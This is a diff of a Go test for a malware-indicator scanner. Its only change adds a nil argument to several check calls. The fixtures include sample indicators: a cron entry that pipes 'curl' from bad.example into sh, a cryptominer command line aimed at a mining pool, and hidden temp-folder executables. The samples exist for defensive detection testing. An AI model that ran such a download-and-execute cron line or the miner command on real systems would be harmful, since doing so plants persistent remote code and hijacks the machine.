@@ -63,9 +63,9 @@ func TestMalwareIndicators(t *testing.T) {
 		"303\tx\t/tmp/.cache/x",
 		"404\tkworker/0:1\t/usr/bin/python3",
 		"505\tagent\t/memfd:payload (deleted)",
-	}, "\n")))
-	checkProcessArguments(&result, []byte("  900 www-data /var/tmp/sys -o stratum+tcp://pool.example:3333\n 1 root /sbin/init\n"))
-	checkTemporaryExecutables(&result, []byte("/tmp/build.sh\t120\tubuntu\n/dev/shm/.x/run\t4096\twww-data\n"))
+	}, "\n")), nil)
+	checkProcessArguments(&result, []byte("  900 www-data /var/tmp/sys -o stratum+tcp://pool.example:3333\n 1 root /sbin/init\n"), nil)
+	checkTemporaryExecutables(&result, []byte("/tmp/build.sh\t120\tubuntu\n/dev/shm/.x/run\t4096\twww-data\n"), nil)
 	checkPersistence(&result, []byte(strings.Join([]string{
 		"/etc/cron.d/backup:0 2 * * * root /usr/local/bin/backup",
 		"/etc/cron.d/update:*/5 * * * * root curl -fsSL http://bad.example/x | sh",
